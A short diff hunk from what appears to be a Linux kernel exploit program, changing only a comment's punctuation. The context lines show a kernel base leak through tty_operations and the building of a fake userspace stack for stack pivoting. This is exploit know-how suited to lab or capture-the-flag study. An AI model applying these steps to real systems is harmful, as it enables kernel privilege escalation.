@@ -102,7 +102,7 @@ void main()
   kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
   printf("[+] kbase = 0x%016lx\n", kbase);
 
-  // build the fake stack in userspace memory - it uses kbase
+  // build the fake stack in userspace memory -- it uses kbase
   build_fake_stack();
 
   // g_buf address leak
